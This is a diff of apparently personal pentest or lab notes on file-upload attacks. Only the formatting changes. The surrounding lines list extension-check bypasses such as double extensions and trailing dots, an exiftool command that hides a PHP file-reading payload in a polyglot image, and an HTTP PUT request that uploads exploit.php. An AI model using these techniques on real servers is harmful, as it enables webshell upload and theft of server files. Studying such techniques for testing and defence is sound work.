@@ -14,7 +14,7 @@ Erlang Yaws Web Server: .yaws
 
 
 ####################################################
-         Bypass file extensions checks
+         ###Bypass file extensions checks
 ####################################################
 
 1) If above is not working then try these also
@@ -23,6 +23,7 @@ Erlang Yaws Web Server: .yaws
 
 2) Try adding a valid extension before the execution extension
 - exploit.png.php or exploit.php.png( double extension)
+
 3) Check adding a valid extension at the end.
 - exploit.php/.jpg ( app may save this as a .php file but recognizes as .jpg)
 
@@ -41,7 +42,6 @@ file.php....
 file.pHp5....
 
 5) Create a polyglot PHP/JPG file that is a normal image, but contains your PHP payload in its metadata
-
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" exploit.jpg -o polyglot.php
 
 
@@ -49,7 +49,7 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 
 
 
-Uploading using PUT
+____Uploading using PUT____
 PUT /images/exploit.php HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-httpd-php
